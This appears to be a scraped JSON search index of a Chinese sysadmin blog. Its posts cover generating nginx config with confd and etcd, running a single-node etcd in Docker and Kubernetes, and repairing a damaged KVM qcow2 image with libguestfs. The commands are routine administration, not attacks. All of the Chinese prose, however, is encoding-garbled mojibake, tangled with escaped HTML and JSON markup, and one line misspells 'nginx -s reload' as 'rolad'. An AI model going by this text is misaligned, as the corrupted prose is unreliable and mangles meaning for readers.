[template] src = \u0026#34;nginx.conf.tmpl\u0026#34; dest = \u0026#34;/etc/nginx/conf.d/nginx-auto.conf\u0026#34; keys = [ \u0026#34;/nginx/app01/subdomain\u0026#34;, \u0026#34;/nginx/app01/upstream\u0026#34;, ] check_cmd = \u0026#34;/usr/sbin/nginx -t\u0026#34; reload_cmd = \u0026#34;/usr/sbin/nginx -s reload\u0026#34; EOF cat \u0026lt;\u0026lt;EOT\u0026gt;\u0026gt;/etc/confd/templates/nginx.conf.tmpl upstream {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}} { {{range getvs \u0026#34;/nginx/app01/upstream/*\u0026#34;}} server {{.}}; {{end}} } server { server_name {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}.example.com; location / { proxy_pass http://{{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } EOT confd ä¼šæ ¹æ® etcd çš„å€¼ï¼Œç»“åˆ nginx.conf.tmpl ï¼Œç”Ÿæˆ nginx-auto.confï¼Œç„¶å nginx -t éªŒè¯é€šè¿‡åï¼Œæ‰§è¡Œ nginx -s roladã€‚\næ³¨æ„ï¼šnginxçš„é…ç½®ä¸­å¿…é¡»æœ‰ include /etc/nginx/conf.d/*.conf;\näºŒã€è¿è¡Œconfd # åªå¤„ç†ä¸€æ¬¡ confd -onetime -backend etcd -node http://etcd-svc.default:2379 # æŒ‰æ—¶é—´è½®è¯¢ confd -interval=60 -backend etcd -node http://etcd-svc.default:2379 \u0026amp; è¿™æ ·å°±å¯ä»¥åŠ¨æ€æ›´æ–° Nginx äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211021-etcd_confd_nginx/","summary":"\u003cp\u003eä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬ä»‹ç»äº† ETCD çš„å®¹å™¨åŒ–ï¼Œæè¿™ä»¶äº‹æƒ…çš„ä¸»è¦ç›®çš„å…¶å®æ˜¯è¦åŠ¨æ€æ›´æ–° Nginx çš„é…ç½®\u003c/p\u003e\n\u003cp\u003eè¿™ä¸€ç« æˆ‘ä»¬å°±æ¥é…ç½® confd å’Œ Nginxï¼Œæ¥è¾¾åˆ°åŠ¨æ€æ›´æ–° Nginx é…ç½®çš„ç›®çš„\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…é…ç½®confd\"\u003eä¸€ã€å®‰è£…é…ç½®confd\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½å¹¶å®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv confd-0.16.0-linux-amd64 /usr/sbin/confd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x /usr/sbin/confd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬åœ¨ etcd ä¸­å­˜æ”¾çš„æ ¼å¼å¦‚ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eetcdctl set /nginx/app01/subdomain app1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eetcdctl set /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/nginx/app01/subdomain \u0026#34;app01\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/nginx/app01/upstream/app01_2 \u0026#34;192.168.0.2:5601\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆ confd çš„é…ç½®æ–‡ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /etc/confd/\u003cspan class=\"o\"\u003e{\u003c/span\u003econf.d,templates\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/confd/conf.d/nginx.toml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[template]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esrc = \u0026#34;nginx.conf.tmpl\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edest = \u0026#34;/etc/nginx/conf.d/nginx-auto.conf\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekeys = [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;/nginx/app01/subdomain\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;/nginx/app01/upstream\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003echeck_cmd = \u0026#34;/usr/sbin/nginx -t\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ereload_cmd = \u0026#34;/usr/sbin/nginx -s reload\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOT\u0026gt;\u0026gt;/etc/confd/templates/nginx.conf.tmpl\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eupstream {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}} {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{{range getvs \u0026#34;/nginx/app01/upstream/*\u0026#34;}}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    server {{.}};\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{{end}}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eserver {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    server_name  {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}.example.com;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    location / {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_pass        http://{{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}};\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_redirect    off;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_set_header  Host             $host;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_set_header  X-Real-IP        $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e   }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003econfd ä¼šæ ¹æ® etcd çš„å€¼ï¼Œç»“åˆ nginx.conf.tmpl ï¼Œç”Ÿæˆ nginx-auto.confï¼Œç„¶å nginx -t éªŒè¯é€šè¿‡åï¼Œæ‰§è¡Œ nginx -s roladã€‚\u003c/p\u003e","title":"ETCD + CONFD + NGINXçš„é…ç½®"},{"content":"ç”±äºä½¿ç”¨åˆ°äº†é˜¿é‡Œçš„ K8S æ‰˜ç®¡é›†ç¾¤ ACKï¼Œäºæ˜¯æƒ³å ä¾¿å®œã€‚æƒ³ç”¨åˆ°æ‰˜ç®¡ master node çš„ etcd æ¥ä¿å­˜æ•°æ®ã€‚\nç»“æœæ˜¯ï¼Œæœªé‚ï¼ï¼æ— æ³•ä½¿ç”¨ã€‚\né˜¿é‡Œæœ‰å•ç‹¬çš„é…ç½®ç®¡ç†æœåŠ¡ï¼Œå¤æ‚åŒ–äº†ï¼Œä¸æƒ³ç”¨ã€‚\né‚£ä¹ˆè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œå¯åŠ¨åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹å‰¯æœ¬çš„ etcd podï¼Œç„¶åæ•°æ®æŒä¹…åŒ–åˆ° OSS çš„ S3 æ¡¶ä¸­ã€‚\nä¸€ã€å®ç°etcdçš„å•èŠ‚ç‚¹dockeråŒ– é¦–å…ˆæˆ‘ä»¬åªæƒ³åœ¨æµ‹è¯•ç¯å¢ƒä¸­è·‘ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcdï¼Œè¿˜æ²¡æœ‰ç”¨åˆ° k8sï¼Œåšæ³•å¦‚ä¸‹ï¼š\n#!/bin/bash NODE1=172.18.31.33 REGISTRY=quay.io/coreos/etcd # available from v3.2.5 #REGISTRY=gcr.io/etcd-development/etcd docker run \\ -p 2379:2379 \\ -p 2380:2380 \\ --volume=/data/etcd:/etcd-data \\ --name etcd ${REGISTRY}:latest \\ /usr/local/bin/etcd \\ --data-dir=/etcd-data --name node1 \\ --initial-advertise-peer-urls http://${NODE1}:2380 --listen-peer-urls http://0.0.0.0:2380 \\ --advertise-client-urls http://${NODE1}:2379 --listen-client-urls http://0.0.0.0:2379 \\ --initial-cluster node1=http://${NODE1}:2380 å¦‚ä¸Šå°±å¯ä»¥äº†ï¼Œå®¹å™¨è·‘èµ·æ¥ä»¥åè¿›å…¥å®¹å™¨æµ‹è¯•ä¸€ä¸‹ï¼š\ndocker exec -it 425f26903466 /bin/sh etcdctl -C http://127.0.0.1:2379 member list c3511611548b7c7c: name=node1 peerURLs=http://172.18.31.33:2380 clientURLs=http://172.18.31.33:2379 isLeader=true etcdctl ls --recursive / è¿™æ ·ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcd å°±å¼„å¥½äº†ï¼Œå¯¹å¤–æš´éœ²çš„æ˜¯ 2379 å’Œ 2380 ç«¯å£\näºŒã€å®ç° etcd çš„å•èŠ‚ç‚¹ k8s åŒ– é¦–å…ˆç¼–å†™ä¸€ä¸ªdeploymentæ–‡ä»¶etcd-deploy.yamlï¼š\nä¸‹è½½ï¼šetcd-deploy.yaml\napiVersion: apps/v1 kind: Deployment metadata: name: etcd-deploy labels: app: etcd spec: replicas: 1 selector: matchLabels: app: etcd template: metadata: labels: app: etcd spec: containers: - name: etcd image: quay.io/coreos/etcd:latest ports: - containerPort: 2379 name: client protocol: TCP - containerPort: 2380 name: server protocol: TCP command: - /usr/local/bin/etcd - --name - etcd - --initial-advertise-peer-urls - http://etcd:2380 - --listen-peer-urls - http://0.0.0.0:2380 - --listen-client-urls - http://0.0.0.0:2379 - --advertise-client-urls - http://etcd:2379 - --initial-cluster - etcd=http://etcd:2380 - --data-dir - /etcd-data volumeMounts: - mountPath: /etcd-data name: etcd-data lifecycle: postStart: exec: command: - \u0026#34;sh\u0026#34; - \u0026#34;-c\u0026#34; - \u0026gt; echo \u0026#34;127.0.0.1 etcd\u0026#34; \u0026gt;\u0026gt; /etc/hosts; volumes: - name: etcd-data persistentVolumeClaim: claimName: k8s-etcd-20g restartPolicy: Always æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ª pvc å· k8s-etcd-20gï¼Œè¿™ä¸ªå·æŒ‚åœ¨ /etcd-dataï¼Œæ˜¯ç”± OSS å»ºç«‹çš„ï¼Œç”¨äºæŒä¹…è¯æ•°æ®ï¼Œçœå¾—é‡å¯ etcd çš„ podï¼Œæ•°æ®æ¶ˆå¤±ä¸è§äº†ã€‚\nç„¶åï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ª deployment ä½œä¸º svc æœåŠ¡æš´éœ²åœ¨é›†ç¾¤ä¸­ï¼Œå†ç¼–å†™ä¸€ä¸ªetcd-svc.yaml\nä¸‹è½½ï¼šetcd-svc.yaml\napiVersion: v1 kind: Service metadata: name: etcd-svc spec: ports: - port: 2379 name: tcp2379 protocol: TCP targetPort: 2379 - port: 2380 name: tcp2380 protocol: TCP targetPort: 2380 selector: app: etcd type: ClusterIP kubectl apply éƒ¨ç½²åˆ° k8s ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚\nk8sæµ‹è¯•æ–¹æ³•ï¼Œéšä¾¿å¯åŠ¨ä¸€ä¸ª busybox podï¼Œè¿›å»æµ‹è¯•ä¸€ä¸‹ï¼š\nkubectl run curl --image=radial/busyboxplus:curl -i --tty --rm curl http://etcd-svc:2379/version curl http://etcd-svc.default:2379/version curl http://etcd-svc.default:2379/v2/keys curl http://etcd-svc.default:2379/v2/keys/?recursive=true curl http://etcd-svc.default:2379/v2/keys/service/nginx curl http://etcd-svc.default:2379/v2/keys/service/nginx/127.0.0.1 curl --location --request PUT \u0026#39;http://etcd-svc:2379/v2/keys/service/nginx/10.240.0.41\u0026#39; --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data-urlencode \u0026#39;value=10.240.0.41:9000\u0026#39; curl http://etcd-svc.default:2379/v2/keys/service/nginx/ ","permalink":"https://rendoumi.com/posts/20211021-etcd_docker/","summary":"\u003cp\u003eç”±äºä½¿ç”¨åˆ°äº†é˜¿é‡Œçš„ K8S æ‰˜ç®¡é›†ç¾¤ ACKï¼Œäºæ˜¯æƒ³å ä¾¿å®œã€‚æƒ³ç”¨åˆ°æ‰˜ç®¡ master node çš„ etcd æ¥ä¿å­˜æ•°æ®ã€‚\u003c/p\u003e\n\u003cp\u003eç»“æœæ˜¯ï¼Œæœªé‚ï¼ï¼æ— æ³•ä½¿ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eé˜¿é‡Œæœ‰å•ç‹¬çš„é…ç½®ç®¡ç†æœåŠ¡ï¼Œå¤æ‚åŒ–äº†ï¼Œä¸æƒ³ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œå¯åŠ¨åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹å‰¯æœ¬çš„ etcd podï¼Œç„¶åæ•°æ®æŒä¹…åŒ–åˆ° OSS çš„ S3 æ¡¶ä¸­ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®ç°etcdçš„å•èŠ‚ç‚¹dockeråŒ–\"\u003eä¸€ã€å®ç°etcdçš„å•èŠ‚ç‚¹dockeråŒ–\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬åªæƒ³åœ¨æµ‹è¯•ç¯å¢ƒä¸­è·‘ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcdï¼Œè¿˜æ²¡æœ‰ç”¨åˆ° k8sï¼Œåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.33\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eREGISTRY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003equay.io/coreos/etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# available from v3.2.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#REGISTRY=gcr.io/etcd-development/etcd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -p 2379:2379 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -p 2380:2380 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --volume\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/etcd:/etcd-data \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --name etcd \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eREGISTRY\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:latest \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  /usr/local/bin/etcd \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --data-dir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etcd-data --name node1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --initial-advertise-peer-urls http://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:2380 --listen-peer-urls http://0.0.0.0:2380 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --advertise-client-urls http://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:2379 --listen-client-urls http://0.0.0.0:2379 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --initial-cluster \u003cspan class=\"nv\"\u003enode1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:2380\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚ä¸Šå°±å¯ä»¥äº†ï¼Œå®¹å™¨è·‘èµ·æ¥ä»¥åè¿›å…¥å®¹å™¨æµ‹è¯•ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it 425f26903466 /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eetcdctl -C http://127.0.0.1:2379 member list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ec3511611548b7c7c: \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enode1 \u003cspan class=\"nv\"\u003epeerURLs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://172.18.31.33:2380 \u003cspan class=\"nv\"\u003eclientURLs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://172.18.31.33:2379 \u003cspan class=\"nv\"\u003eisLeader\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eetcdctl ls --recursive /\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcd å°±å¼„å¥½äº†ï¼Œå¯¹å¤–æš´éœ²çš„æ˜¯ 2379 å’Œ 2380 ç«¯å£\u003c/p\u003e","title":"etcdå•èŠ‚ç‚¹åº”ç”¨"},{"content":"åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æˆ‘ä»¬å¤§é‡ä½¿ç”¨äº† kvm çš„è™šæ‹ŸæŠ€æœ¯ï¼Œè™šæ‹Ÿæœºçš„é•œåƒç³»ç»Ÿä½¿ç”¨çš„æ˜¯ Cloud-init çš„æŠ€æœ¯\nä¸å¯é¿å…çš„ï¼Œè™šæœºä¼šé­åˆ°å„ç§æŸåï¼Œç»´æŠ¤çš„æ‰‹æ®µå°±ååˆ†å¿…è¦äº†\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè™šæœºæ–‡ä»¶ vis-16-41-18.qcow2 åäº†\nä¸€ã€å®‰è£…æ”¯æŒåŒ… yum install libguestfs libguestfs-tools äºŒã€æŸ¥çœ‹æ—¥å¿— virt-log -a vis-16-41-18.qcow2 æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æŠ¥é”™ä¿¡æ¯\nä¸‰ã€åˆ†ææ–‡ä»¶ç³»ç»Ÿç»„æˆ virt-filesystemså’Œvirt-dféƒ½å¯ä»¥ï¼Œç”¨virt-dfçœ‹çš„æ›´å¤šä¸€äº›\nvirt-filesystems -l -a vis-16-41-18.qcow2 Name Type VFS Label Size Parent /dev/sda1 filesystem ext4 - 209715200 - /dev/sda2 filesystem ext4 - 214536355840 - virt-df -a vis-16-41-18.qcow2 Filesystem 1K-blocks Used Available Use% vis-16-41-18.qcow2:/dev/sda1 194241 31706 152295 17% vis-16-41-18.qcow2:/dev/sda2 206088704 5639856 189973444 3% å››ã€æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤ï¼ˆæ–¹æ³•1ï¼‰ ä»ä¸Šé¢å¯ä»¥çœ‹åˆ° vis-16-41-18.qcow2 é‡Œé¢æœ‰ä¸¤ä¸ªåˆ†åŒºï¼Œ/dev/sda1 å’Œ/dev/sda2\nç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯/bootï¼Œç¬¬äºŒä¸ªæ˜¯/\næŠŠ / mount å‡ºæ¥\nmkdir 18 guestmount -a vis-16-41-18.qcow2 -m /dev/sda2 --rw ./18 æˆ–è€…å…¨è‡ªåŠ¨mount\nguestmount -a vis-16-41-18.qcow2 -i --rw ./18 è¿™æ ·å°±å¯ä»¥ç›´æ¥è¿›18ç›®å½•è¿›è¡Œä¿®å¤æ“ä½œäº†\ncd 18/lib64 ls libc*.* å‘ç°åŒäº‹èƒ¡ä¹±å‡çº§glibcï¼ŒæŠŠlibcçš„åŸºç¡€åº“å¼„åäº†ï¼Œå°‘libc.so.6çš„è½¯é“¾æ¥ï¼Œå»ºç«‹ä¸€ä¸ªä¿®å¤å³å¯\nln -s libc-2.15.so libc.so.6 